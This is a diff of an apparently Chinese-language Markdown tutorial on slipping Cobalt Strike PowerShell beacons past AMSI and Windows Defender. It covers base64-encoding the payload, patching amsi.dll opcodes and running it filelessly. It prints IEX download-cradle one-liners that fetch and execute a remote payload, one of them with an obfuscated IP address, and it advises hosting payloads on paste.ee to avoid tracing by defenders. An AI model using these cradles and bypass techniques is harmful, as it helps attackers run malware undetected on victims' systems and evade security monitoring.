@@ -5,7 +5,7 @@
 
 # 0x01.通过修补 AMSI.dll 的操作码绕过ASMI
 
-1.用cobaltstrike生成一个beacon.ps1,当然你用generator也可以
+# 1.用cobaltstrike生成一个beacon.ps1,当然你用generator也可以
 ![image](https://user-images.githubusercontent.com/89376703/155735798-0388189e-ec01-47d4-976c-799891746687.png)
 
 ![image](https://user-images.githubusercontent.com/89376703/155735869-45a3c954-8737-4ac4-a4ad-3b750f335b82.png)
@@ -20,7 +20,7 @@
 ![image](https://user-images.githubusercontent.com/89376703/155733969-384abfb3-64be-4c93-b2b8-c7c60ea8dd13.png)
 
 
-# 这里使用C#加密器对整个ps1文件进行base64加密
+# 使用C#加密器对整个ps1文件进行base64加密
 ![image](https://user-images.githubusercontent.com/89376703/155734073-c1d9b0d1-0da9-40b2-ad38-bdc10a5563fb.png)
 
 
@@ -34,12 +34,14 @@
 ![image](https://user-images.githubusercontent.com/89376703/155734157-19d0ed09-04fd-4ce2-90d4-6b27b0ef65cc.png)
 
 
-![image](https://user-images.githubusercontent.com/89376703/155734244-a2185115-0d62-4b8c-96f0-7e09b6caf530.png)
+
+# 这里就是一个常用的base64的解密公式
+
+``` 
+解密后的变量 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(加密后的变量)); 
+```
 
 
-# $Address 后面一串就是base64解密公式。然后用IEX 去执行这个字符串变量
-
-![image](https://user-images.githubusercontent.com/89376703/155734381-81a55fb3-78f8-4303-b78a-0e88702ff2fb.png)
 
 # 但是amsi.dll对IEX是有严格限制的，直接执行解密密文必然会被拦截，因此这里我们需要一段破坏或者劫持amsi.dll的ps代码
 
@@ -99,11 +101,11 @@ $hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)
 
 # 将混淆过后的代码插入解密代码中
 
-![image-20220225171012792](C:\Users\16915\Desktop\bypass asmi\image-20220225171012792.png)
+![image](https://user-images.githubusercontent.com/89376703/155734244-a2185115-0d62-4b8c-96f0-7e09b6caf530.png)
 
 # 放在windows defender环境下无文件执行即可
 
-![image](https://user-images.githubusercontent.com/89376703/155734476-9c71d493-28df-4b6d-890f-069301c2312b.png)
+![image](https://user-images.githubusercontent.com/89376703/155734381-81a55fb3-78f8-4303-b78a-0e88702ff2fb.png)
 
 # 可以看到可以绕过微软，能执行一些基本的命令，但是dumplass应该不行。
 
@@ -137,7 +139,7 @@ HRESULT AmsiScanBuffer(
 
 ## 在上面的示例中，句柄设置为“AmsiUacInitialize()”，尽管你可以在技术上使用 Amsi.dll 中的任何函数。这种方法在针对“AmsiScanBuffer()”创建签名的情况下很有用。
 
-## 0x02.分离免杀:抛弃 net webclient 远程加载方式（一）
+# 0x02.分离免杀:抛弃 net webclient 远程加载方式（一）
 
 ## 这里采用.net中的webrequest去请求远程恶意样本内容、读取样本、并执行样本。其实加载原理都是用IEX去执行远程的样本内容，大同小异，这边只是修改了一些特征，这里执行的前提是远程加载的powershell样本也得免杀，我们通常会将样本放置在网页可以访问的web服务器上，但是这同时也带来了风险，因为有些高级防病毒软件会标记一些恶意的公网IP（比如说卡巴斯基、小红伞），如果你将样本托管GitHub，虽然虽不会被防病毒标记，但是实战中一下就被蓝队溯源了，我这里推荐一个可以在公网上挂起文本并且合法的网站https://paste.ee/  
 
@@ -172,6 +174,7 @@ IEX ((new-object net.webclient).downloadstring('http://0.0.0.0:8000/bypass.txt'.
 ```
 IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()2.202.188@@@@@:8000/byp**************ass.tx**************t".Replace('@@@@@','').Replace('@!#$%^&*()','').Replace('**************',''))
 ```
+![image](https://user-images.githubusercontent.com/89376703/155738711-0f72d9db-57de-4d25-aabb-405d9c2b4ee6.png)
 
 
 
